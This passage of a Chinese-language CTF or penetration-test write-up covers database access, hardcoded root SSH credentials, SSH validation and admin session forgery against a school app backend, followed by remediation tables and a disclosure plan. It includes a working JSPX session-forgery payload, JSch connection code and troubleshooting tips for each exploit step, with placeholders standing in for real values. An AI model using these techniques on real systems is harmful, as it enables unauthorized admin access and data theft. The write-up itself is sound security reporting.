- 后续所有数据库操作都应在授权范围内、只读、最小化。

### 8.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 404 | 路径不对或文件不存在 | 用环境探针拿到的 `ROOT` 拼绝对路径 |
| 空响应 | 文件为空/权限不足 | 换 `WEB-INF/classes/` 下其他文件 |
| 乱码 | 编码不是 UTF-8 | 按 `ISO-8859-1` 读取，或下载原始字节 |
| 500 | 路径含特殊字符 | 对 `f` 参数做 URL 编码 |
| 只读到一部分 | 文件较大/输出被截断 | 先看文件大小，再分段读取 |

---

## 9. 阶段 7：数据库访问

### 9.1 目标

验证配置中的数据库凭据是否可用，并确认其中是否保存了管理员账号、服务器清单等敏感数据。

### 9.2 连接方式

在 JSPX 中通过 JDBC 连接：

```java
String url = "jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?useSSL=false";
Class.forName("com.mysql.cj.jdbc.Driver");
Connection c = DriverManager.getConnection(url, "<DB_USER>", "<DB_PASSWORD>");
```

> 真实主机、库名、账号、密码均已替换为占位符。复现时只能使用靶场快照中的值。

### 9.3 关键表（值已脱敏）

| 表 | 作用 | 观察到的主要内容 |
|---|---|---|
| `sys_user` | 后台用户 | `id=1`，账号 `<ADMIN_ACCOUNT>`，密码 `<ADMIN_HASH>`（MD5，无盐） |
| `the_server` | 服务器清单 | 9 台内网服务器，地址 `<INTERNAL_IP_1>` ~ `<INTERNAL_IP_9>` |
| `system_operation` | 学校→服务器映射 | 学校与端口段的对应关系（具体端口已隐去） |
| `app_role` | 角色 | 教师、管理员、超级管理员（按学校划分） |
| `user_app_log_file` | 用户上传文件 | XML/DB 的 BLOB，XML 中含 `<USER_TOKEN>` 等字段 |
| `res_app_role` / `per_r` | 教师端权限 | 角色-资源权限映射 |

### 9.4 管理员密码哈希

`SysLoginCtl` 的登录逻辑可以还原为：

```java
String md5 = MD5.encode(password);
SysUser user = sysUserService.finduname(username, md5);
```

也就是说：

- 密码使用 **MD5**；
- **没有盐**；
- 可以直接离线比对彩虹表或字典。

> 这是 High 级问题。本文不提供 `<ADMIN_HASH>` 的真实值，也不进行密码破解。

### 9.5 为什么数据库是“枢纽”

拿到数据库后，攻击者可以：

- 读取管理员账号与哈希；
- 读取服务器清单，确定 SSH 目标；
- 读取用户上传的 XML/DB，获取 token 与 PII；
- 修改角色、绑定设备、植入恶意配置（本次未做）。

因此，数据库访问是从“Web 层”走向“基础设施层”的关键一步。

### 9.6 阶段小结

- 配置中的 DB 凭据有效。
- `sys_user` 暴露管理员账号与无盐 MD5。
- `the_server` 暴露内网服务器清单，为 SSH 阶段提供目标。
- 所有真实值均已脱敏。

### 9.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `ClassNotFoundException` | 驱动类名不匹配 | 试 `com.mysql.jdbc.Driver` / `com.mysql.cj.jdbc.Driver` |
| 连接超时 | 网络隔离/防火墙 | 从 Web 服务器侧测试 `<DB_HOST>:3306` |
| `Access denied` | 凭据错误或来源限制 | 核对配置；不要尝试提权 |
| 查询报错 | 列名/表名不同 | 先 `SHOW COLUMNS` / `SHOW TABLES` |
| 返回空白 | 表为空/权限不足 | 换表；停止扩大 |

---

## 10. 阶段 8：反编译 `LinuxStateForShell` 与硬编码 root 凭据

### 10.1 目标

从旧后台的 Java 代码中寻找服务器管理功能的实现，确认是否存在硬编码凭据。

### 10.2 定位类

在反编译产物中搜索服务器监控/重启相关代码，找到：

```text
com.boxin.util.LinuxStateForShell
```

这个类负责：

- `getMonitorInfo(scode)`：获取服务器监控信息；
- `restartTomcat(ip, pwd, smark)`：重启 Tomcat；
- `releaseCode(ip, pwd, scode, code)`：发布代码；
- `connect(host, user, password)`：通过 JSch 建立 SSH 连接。

### 10.3 关键代码模式（值已隐去）

`getMonitorInfo` 中直接写死了 root 账号和密码：

```java
return runDistanceShell(
    COMMANDS,
    "<ROOT_ACCOUNT>",     // 实际为 root
    "<ROOT_PASSWORD>",    // 值已隐去
    scode
);
```

`main` 方法中还留有一个示例调用：

```java
releaseCode("<INTERNAL_IP>", "<ROOT_PASSWORD>", "test", "118");
```

`connect` 方法使用 JSch：

```java
Session session = new JSch().getSession(host, user, 22);
session.setPassword(password);
Properties config = new Properties();
config.put("StrictHostKeyChecking", "no");
session.setConfig(config);
session.connect();
```

### 10.4 这意味着什么

1. **服务器 root 密码硬编码在 Web 应用代码里**，任何能读到 class/JSP 源码的人都能拿到。
2. **SSH 直接使用 root**，没有堡垒机、没有跳板、没有密钥限制。
3. **`StrictHostKeyChecking=no`**，不校验主机指纹，容易被中间人攻击。
4. **密码可能被多台服务器复用**，`the_server` 表中的 9 台机器都可能受影响。

> 证据等级：实锤。反编译代码中直接出现明文密码常量；后续 SSH 验证进一步确认凭据正确。

### 10.5 阶段小结

- 硬编码 root 凭据是整条链路中危害最高的发现之一。
- 它不是“配置错误”，而是代码层面的凭据管理失败。
- 修复必须是“轮换 + 改用密钥/堡垒机 + 代码清理”，而不是只删掉字符串。

### 10.6 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 找不到 `LinuxStateForShell` | 反编译不完整/类被混淆 | 搜索字符串、换 `cap_4`/`cap_8` 产物 |
| `javap` 找不到类 | classpath 不对 | 指向 `WEB-INF/classes` 或 JADX 输出 |
| 只看到 Spring 代理类 | AOP/CGLIB | 找 `$$EnhancerBySpringCGLIB` 背后的实现类 |
| 字符串被加密 | 加固/字符串混淆 | 用运行时 hook 或 JADX 的字符串搜索 |
| 代码里没有明文密码 | 已修复/版本不同 | 记录为已修复，不要假设 |

---

## 11. 阶段 9：SSH 验证

### 11.1 目标

验证硬编码的 root 凭据是否真实有效，同时避免对生产服务器造成任何修改。

### 11.2 验证方式

从被攻陷的 Web 服务器（或授权跳板机）发起连接：

```bash
nc -vz <SSH_HOST> 22
```

预期：

```text
Connection to <SSH_HOST> 22 port [tcp/ssh] succeeded!
```

然后使用 JSch 或 SSH 客户端认证：

```java
JSch jsch = new JSch();
Session session = jsch.getSession("<ROOT_ACCOUNT>", "<SSH_HOST>", 22);
session.setPassword("<ROOT_PASSWORD>");
Properties config = new Properties();
config.put("StrictHostKeyChecking", "no");
session.setConfig(config);
session.connect(10000);
```

### 11.3 预期结果与解读

认证返回：

```text
WARNING: Your password has expired.
Password change required but no TTY available.
```

这句话的含义是：

- **认证已经通过**：用户名和密码正确；
- 服务器启用了“密码过期必须改密”策略；
- 非交互式 SSH 没有 TTY，无法完成改密流程，所以命令被拒绝。

因此，这不是“密码错误”，而是“密码正确但账号被强制改密”。凭据的有效性已经得到证明。

### 11.4 为什么不能继续

- 修改密码会影响生产系统，属于破坏性操作。
- 非交互式改密可能触发锁定或审计告警。
- 授权范围只允许“验证”，不允许“变更”。

正确做法是：记录证据，立即通知资产所有者，由其按流程轮换密码。

### 11.5 其他服务器

`the_server` 中的其他地址可能：

- 不可达（`NoRouteToHost`）；
- 端口未开放；
- 密码已轮换；
- 仅允许特定来源 IP。

这些都不影响“至少一台服务器使用该 root 凭据”的结论。

### 11.6 阶段小结

- SSH 认证通过，证明硬编码凭据真实有效。
- 密码过期策略阻止了命令执行，反而避免了进一步破坏。
- 这是整条链路的终点，也是风险最高的位置。

### 11.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `NoRouteToHost` | 网络不可达/ACL | 从 Web 服务器侧发起；确认授权网段 |
| `Connection refused` | SSH 未开放/端口不同 | 确认 `the_server` 配置中的端口 |
| `Permission denied` | 密码已轮换/账号锁定 | 停止，记录 |
| `password expired` | 密码过期策略 | 凭据正确；不要改密 |
| 连接超时 | 防火墙/跳板限制 | 用 JSch 从应用服务器发起 |

---

## 12. 阶段 10：管理后台会话伪造与管理员权限

### 12.1 目标

在不获取管理员明文密码的情况下，验证能否伪造一个被 `LoginFilter` 认可的会话，从而获得管理后台的管理员权限。

> 说明：阶段 10 与阶段 6~9 是并列的利用方向，都从 JSPX RCE 出发；它不需要先完成 SSH 验证。

### 12.2 漏洞链：`LoginFilter` + `SysLoginCtl` + `SysUser`

三个类构成了完整的信任链：

| 组件 | 行为 | 问题 |
|---|---|---|
| `com.boxin.util.LoginFilter` | 只检查 `session.getAttribute("user")` 是否为空；为空且路径不在白名单（白名单含 `.js`、`/admin/login` 等）时，返回登录跳转或超时 JSON | 只判断“有没有”，不校验“是谁” |
| `com.boxin.controller.sys.SysLoginCtl` | 登录成功后执行 `request.getSession().setAttribute("user", sysUser)` | 会话身份是一个普通对象 |
| `com.boxin.bean.sys.SysUser` | `Integer id`、`String account`、`String name`、`String pwd` | 字段是 `id/account/name/pwd`，不是 `user_name` |

关键点：`LoginFilter` 只检查 `session` 里有没有 `user`，不会重新查数据库，也不会校验这个 `user` 是否来自真实登录、是否与当前会话绑定、密码是否正确。因此，只要能向 session 写入一个 `SysUser` 对象，就能通过过滤器。

这也解释了阶段 3 的 `.js` 绕过：`.js` 在白名单里，所以 `/admin/main.js` 不会触发登录跳转。阶段 10 则是从另一个方向绕过同一道门：不是换路径，而是直接把“已登录”写进 session。

### 12.3 会话伪造 JSPX

在已获得 JSPX 代码执行的前提下，写入以下文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
com.boxin.bean.sys.SysUser u = new com.boxin.bean.sys.SysUser();
u.setId(Integer.valueOf(1));
u.setAccount("<ADMIN_ACCOUNT>");
u.setName("admin");
u.setPwd("x");
javax.servlet.http.HttpSession s = request.getSession(true);
s.setAttribute("user", u);
s.setMaxInactiveInterval(3600);
out.print("SID=" + s.getId());
</jsp:scriptlet>
</jsp:root>
```

注意事项：

- 属性名必须是 **`user`**，不是 `loginUser`、`currentUser` 或 `user_name`。
- `SysUser` 的字段是 **`id/account/name/pwd`**；如果你按 `user_name` 去反射/赋值，会失败。
- `setPwd("x")` 是故意写成假值：过滤器不校验密码，只检查对象是否存在。
- `setName("admin")` 只是显示名，可以任意；真正的账号字段是 `account`，本文用 `<ADMIN_ACCOUNT>` 占位。
- `setId(Integer.valueOf(1))` 对应 `Integer id`；不要传字符串。
- `request.getSession(true)` 会在没有会话时创建新会话；`setMaxInactiveInterval(3600)` 让会话至少保留一小时。

上传并访问后，预期响应：

```text
SID=<SESSION_ID>
```

### 12.4 验证管理后台管理员权限

携带返回的 `JSESSIONID` 访问后台主页：

```http
GET /admin/main HTTP/1.1
Host: <ADMIN_BACKEND>
Cookie: JSESSIONID=<SESSION_ID>
```

预期：

- HTTP **200**；
- 响应体是完整后台主页 HTML；
- **没有** `/admin/login` 跳转脚本。

这说明 `LoginFilter` 已经认可了伪造的会话。

继续调用管理数据接口：

```http
POST /admin/userAppLogFile/list HTTP/1.1
Host: <ADMIN_BACKEND>
Cookie: JSESSIONID=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

pageSize=10&pageIndex=0
```

预期：

- HTTP **200**；
- 返回 JSON；
- 包含 `total=6686`（记录总数可能随靶场数据变化，以实际为准）。

> 为保护用户数据，本文只记录总数 `6686`，不列出任何用户记录、账号、文件名或 token。

### 12.5 为什么这等于“管理员权限”

1. `/admin/*` 的唯一入口检查就是 `LoginFilter`；通过它之后，所有后台控制器都会把请求当作已登录管理员处理。
2. `SysUser` 是后台的 principal（身份对象）；过滤器不重新查库，所以 `pwd="x"` 也能通过。
3. `userAppLogFile/list` 能返回 6686 条记录，证明不只是“页面能打开”，而是**管理数据接口可用**。
4. 整个过程不需要管理员明文密码，也不需要破解第 7 阶段拿到的 `<ADMIN_HASH>`；会话伪造绕过了密码校验。

> 证据等级：实锤。`/admin/main` 返回 200 后台主页；`/admin/userAppLogFile/list` 返回 200 JSON 且 `total=6686`。

### 12.6 影响

- **管理后台管理员权限**：可访问后台主页、日志管理、服务器管理、角色管理等 `/admin/*` 功能。
- **数据泄露**：可读取 `userAppLogFile` 中的用户上传记录（本次只读取总数，未导出记录）。
- **进一步操作风险**：管理员会话可能被用于修改配置、重置密码、操作服务器（本次未做）。
- **无需密码**：即使管理员密码从未泄露，攻击者仍可通过会话伪造进入后台。

### 12.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `/admin/main` 仍跳登录 | Cookie 名不是 `JSESSIONID`，或会话未建立/已过期 | 重新执行 JSPX；确认返回的 `SID`；使用同一主机 |
| 200 但仍是登录页 | `session.setAttribute("user", ...)` 没生效 | 检查属性名是否为 `user`；检查 `SysUser` 是否实例化成功 |
| 500 | `SysUser` 类/字段不匹配 | 确认 `com.boxin.bean.sys.SysUser` 的 setter 是 `setId/setAccount/setName/setPwd` |
| `list` 404/405 | 路径或方法不对 | 使用 `POST /admin/userAppLogFile/list` |
| `list` 406 | Content-Type/Accept 不匹配 | 用表单编码 + `X-Requested-With: XMLHttpRequest` |
| `total=0` | 数据为空/权限仍不足 | 记录实际值；不要枚举用户记录 |
| 会话很快失效 | 容器会话超时/重启 | 重新执行 JSPX；立即验证 |

### 12.8 阶段小结

- 会话属性名是 `user`；`SysUser` 字段是 `id/account/name/pwd`。
- `LoginFilter` 只检查“存在性”，不校验身份来源与完整性。
- 会话伪造可以直接获得管理后台管理员权限，是整条链中“拿后台”的关键一步。
- 修复不能只改过滤器字符串，必须重建会话信任模型。

---

## 13. 攻击链总览

```text
[1] APK 逆向
    @Test(demo=...) 诱饵
      └─ Transform.k → native dz() → 41 条真实端点
           ├─ <TARGET_DOMAIN>  (auth/upms/exercise)
           └─ <ADMIN_BACKEND>  (/admin/*)
                    │
                    ▼
[2] 侦察：两套登录页 + ddddocr 验证码
    - <TARGET_DOMAIN>: code/randomStr 必须在查询串
    - <ADMIN_BACKEND>: 验证码大小写敏感
    → 未获得默认口令，转向鉴权逻辑
                    │
                    ▼
[3] .js 后缀鉴权绕过
    /admin/main      → 200 + JS 跳登录
    /admin/main.js   → 200 + 完整后台主页
    → 未登录访问后台页面 / 菜单树 / 服务器管理
                    │
                    ▼
[4] DWR 未授权
    /dwr/index.html → dwrUploadService
    instanceId=0
    uploadApkToDesDir(p0=保存名, file=file.txt)
    → 写入 /resources/teacherApk/<name>
                    │
                    ▼
[5] JSPX RCE
    ${31337*3} → 94011
    <jsp:scriptlet> → 任意 Java
         │
         ├──[6] backup.properties → DB/Redis 凭据（值已隐去）
         ├──[7] MySQL → sys_user / the_server / app_role
         ├──[8] LinuxStateForShell → 硬编码 root 凭据（值已隐去）
         │        └──[9] SSH 验证 → 认证通过（密码过期需改密）
         └──[10] 会话伪造 → 管理后台管理员权限
                  session["user"]=SysUser → JSESSIONID
                  → GET /admin/main 200
                  → POST /admin/userAppLogFile/list
                    200 JSON, total=6686
```

---

## 14. 漏洞影响表

| 严重度 | 漏洞 | 影响 | 修复建议 |
|---|---|---|---|
| **Critical** | `.js` 后缀鉴权绕过 | 未登录访问整个管理后台页面、菜单、服务器管理、日志管理 | 统一路径规范化；鉴权在路由前完成；不要用后缀白名单放行；对 `/admin/**` 一律要求会话 |
| **Critical** | DWR 未授权调用 | 任意调用 `dwrUploadService`，上传文件、探测内网 | 禁用 DWR；如必须保留，限制来源 IP、强制登录、白名单方法 |
| **Critical** | `uploadApkToDesDir` 任意文件写入 | 写入 Web 目录，文件名可控，可升级为 RCE | 上传目录移出 Web 根；禁止脚本执行；服务端生成随机文件名；校验类型与大小 |
| **Critical** | JSPX RCE | 以 Tomcat 权限执行任意 Java，读取配置、连 DB、SSH 内网 | 上传目录禁止 JSP/JSPX 解析；容器最小权限；RASP/IAST 检测 |
| **Critical** | 管理后台会话伪造（会话属性信任） | `LoginFilter` 只检查 `session.getAttribute("user")`；伪造 `SysUser` 即可获得管理员权限，读取 `total=6686` 的日志数据 | 服务端会话签名/加密；会话身份由可信存储解析；登录后重新加载 principal；绑定会话与身份；禁止客户端可控的会话对象；禁止任意 JSPX 写 session；最小化 session 属性 |
| **Critical** | 硬编码服务器 root 密码 | 直接获得服务器 root 权限（本次因密码过期策略未执行命令） | 立即轮换所有服务器密码；改用 SSH 密钥 + 堡垒机；禁止 root 直连；清理代码中的明文凭据 |
| **Critical** | DB/Redis 凭据明文存放在 Web 根 | Web 层一旦被突破，数据库与缓存随即失守 | 使用密钥管理服务；配置加密；最小权限账号；网络隔离 |
| **High** | `downloadFile1.js` 未授权下载 | 批量下载用户 XML/DB，泄露账号、姓名、token、PII | 文件访问鉴权；按用户隔离；下载链接短时效签名 |
| **High** | 管理员密码 MD5 无盐 | 哈希可离线破解，撞库成本低 | 改用 bcrypt/Argon2 + 随机盐；强制强密码；MFA |
| **High** | 客户端硬编码密钥/凭据 | 攻击者可伪造签名、解密流量、复用应用凭据 | 不要把秘密放进客户端；使用服务端签发短期凭据；证书绑定仅作辅助 |
| **Medium** | DWR 接口/测试页暴露 | 泄露方法名、参数结构、内部类名 | 关闭 `dwr/test`、`dwr/index.html`；生产环境不部署 DWR |
| **Medium** | 后台菜单树可未授权读取 | 泄露功能地图，降低攻击者枚举成本 | 静态资源鉴权；移除敏感菜单文件 |
| **Medium** | `StrictHostKeyChecking=no` | SSH 连接易被中间人攻击 | 启用主机指纹校验；使用 known_hosts |
| **Low** | 版本/组件信息泄露 | 攻击者据此匹配已知漏洞 | 隐藏版本号；及时更新 |

---

## 15. 经验教训与加固建议

### 15.1 对开发者

1. **客户端不保存秘密**。AES 密钥、RSA 私钥、appSecret、root 密码都不应该出现在 APK 或前端代码里。混淆和加固只能提高成本，不能改变“可被提取”的事实。
2. **诱饵端点不是安全机制**。把真实路径藏进 native 只能延缓逆向，不能阻止逆向。真正的安全依赖服务端鉴权。
3. **不要用 URL 后缀做鉴权**。`.js`、`.css`、`.png` 白名单必须和路由规范化使用同一套路径；更推荐“默认拒绝 + 显式放行”。
4. **上传功能按“不可信输入”设计**：
   - 服务端生成文件名；
   - 白名单扩展名 + 真实 MIME/魔数校验；
   - 上传目录移出 Web 根；
   - 目录禁止脚本执行；
   - 限制大小、数量、频率；
   - 上传后做病毒/内容扫描。
5. **禁用或严格限制 DWR**。这是历史遗留框架，默认暴露方法、测试页和类型信息。生产环境不应把 `dwr/test` 暴露在公网。
6. **配置与代码分离**。数据库、Redis、SSH 凭据放入密钥管理服务（Vault/KMS/云密钥），不要写在 `WEB-INF/classes/*.properties`。
7. **最小权限**：
   - Web 应用连接 DB 的账号只授予必要表的读写权限；
   - Redis 设置 ACL，禁止危险命令；
   - 服务器禁止 root 直连，使用普通账号 + sudo；
   - 使用堡垒机与 SSH 密钥，不用共享密码。
8. **密码存储使用现代算法**。MD5/SHA1 无盐已不可接受；使用 bcrypt、scrypt 或 Argon2，并加随机盐。
9. **不要让 WAF 成为唯一防线**。本次绕过并没有使用复杂的混淆，只是利用了“WAF 检查 multipart 文件名、服务端使用另一个字段”的语义差。安全设计必须假设 WAF 会被绕过。
10. **不要把 session 属性当作身份凭证**。`LoginFilter` 只检查 `session.getAttribute("user")` 是否存在，任何能写 session 的代码路径（JSPX、反序列化、会话固定）都能伪造管理员。正确做法：session 只存不透明 ID，服务端每次从可信存储加载 principal；登录/提权时轮换 session ID；对会话 cookie 做签名/加密并绑定用户；不要把可序列化的业务对象直接放进 session。

### 15.2 对运维与防守方

1. **资产盘点**：确认旧后台、DWR、测试页、静态目录是否仍在公网暴露。
2. **日志与告警**：
   - 监控 `/admin/*.js` 的异常访问；
   - 监控 `/dwr/*` 的调用；
   - 监控上传目录中新增的 `.jsp` / `.jspx` / `.war`；
   - 监控 Web 进程发起的 SSH 连接；
   - 监控数据库账号的异常查询。
3. **网络隔离**：Web 服务器到数据库、Redis、SSH 的访问应最小化；不要让 Web 层成为万能跳板。
4. **凭据轮换**：一旦怀疑泄露，立即轮换 DB、Redis、SSH、后台账号密码，并检查是否有持久化。
5. **应急响应**：保留证据、隔离主机、排查 webshell、检查计划任务与 SSH 公钥、审计数据库变更。
6. **监控会话伪造**：关注非登录路径创建的 session、同一 Cookie 首次访问 `/admin/main`、异常 `/admin/userAppLogFile/list` 调用，以及 JSPX 写入后立即出现的 `JSESSIONID`。

### 15.3 对 CTF 参赛者

1. **先读客户端，再打服务端**。真实端点往往藏在 native/拦截器/配置里。
2. **不要爆破**。一次默认口令、一次精确验证，比一万次撞库更有效，也更安全。
3. **注意参数位置**。`code/randomStr` 在 query 还是 body，可能决定请求是否被接受。
4. **注意大小写**。验证码 OCR 统一小写，往往能显著提高通过率。
5. **关注“语义差”**：WAF 检查的字段 vs 服务端使用的字段；鉴权判断的路径 vs 路由使用的路径。这类差异比 payload 混淆更可靠。
6. **验证即停**。拿到证据就停止，不要为了“再多拿一点”而破坏系统或泄露数据。
7. **用工具的安全默认值**。仓库中的 `tsn_ctf_probe.py` 默认 dry-run，真正发送需要同时加 `--execute --authorized`，单次最多 5 个请求；不要把 `--allow-production-domain` 当成常规选项。
8. **拿到代码执行后，先看过滤器信任什么**。本例只需写入 `session["user"]` 就能拿后台权限，不必破解管理员密码；属性名 `user` 和字段 `id/account/name/pwd` 是关键细节。

---

## 16. 负责任披露与后续

### 16.1 披露时间线（建议）

| 时间 | 动作 |
|---|---|
| T+0 | 向授权方提交完整报告与复现材料 |
| T+7 | 确认收到，建立修复负责人 |
| T+30 | 完成 Critical 漏洞的临时缓解（下线 DWR、限制 `/admin`、轮换 root/DB/Redis、阻断 JSPX 会话伪造） |
| T+90 | 完成代码修复、凭据轮换、日志审计 |
| T+90 之后 | 双方协商公开脱敏 WRITEUP |

### 16.2 修复优先级

1. **立即**：轮换所有服务器 root、DB、Redis 密码；下线 DWR；限制 `/admin/*` 访问；上传目录禁止脚本执行；临时阻断 JSPX 写入会话的路径。
2. **短期**：重建会话信任模型（见阶段 10）；修复 `.js` 鉴权绕过；删除 `backup.properties` 中的明文凭据。
3. **中期**：改造上传流程；引入密钥管理；数据库最小权限；管理员密码改 bcrypt/Argon2；会话 Cookie 签名/加密并绑定身份。
4. **长期**：安全开发生命周期、代码审计、渗透测试、监控告警。

### 16.3 本文的边界

- 本文只描述方法与已脱敏的证据，不提供可直接使用的真实凭据。
- 本文不包含完整 exploit 链的自动化脚本；复现文档中的脚本均以占位符和靶场为前提。
- 任何读者在使用本文技术前，必须确认自己拥有书面授权。

---

## 附录 A：41 条端点分类速查

| 分类 | 数量 | 关键路径 |
|---|---:|---|
| 基础 | 3 | `/`、`/static/user_agreement.html`、`/static/user_agreement_info.html` |
| 认证 | 2 | `auth/oauth/token`、`auth/token/logout` |
| upms | 14 | `upms/basUser/*`、`upms/sysSchool/*`、`upms/app/*`、`upms/message*` |
| exercise | 16 | `exercise/exerciseSetting/*`、`exercise/exerciseRecord/*`、`exercise/exerciseRunningFace/*`、`exercise/exerciseFeedback/*` |
| 旧后台 | 4 | `/admin/studentAppUpdate/stuAppVersion2`、`/admin/userAppLogFile/addLogData`、`/app/sch/*` |
| 外部 | 2 | 圈子 H5、版本检查 |

完整清单见 [REPRODUCTION.md 附录 A](./REPRODUCTION.md#附录-a41-条真实端点清单)。

## 附录 B：术语表

| 术语 | 解释 |
|---|---|
| JADX | 将 DEX 反编译为 Java 源码的工具 |
| unidbg | 在 PC 上模拟执行 Android native 代码的框架 |
| JNI | Java Native Interface，Java 与 native 代码的桥 |
| DWR | Direct Web Remoting，老式 Java 远程调用框架 |
| JSPX | JSP 的 XML 语法形式 |
| EL | Expression Language，JSP 中的表达式语言 |
| WAF | Web Application Firewall，Web 应用防火墙 |
| PII | Personally Identifiable Information，个人可识别信息 |
| MD5 | 一种已不安全的哈希算法，无盐时易被彩虹表破解 |
| 会话伪造 | 通过写入/固定 session 属性，让服务端把请求当成已登录用户 |

---

> **文档结束**。本文为脱敏公开版，所有真实域名、IP、账号、密码、哈希、令牌、密钥均已隐去。仅限授权范围使用。
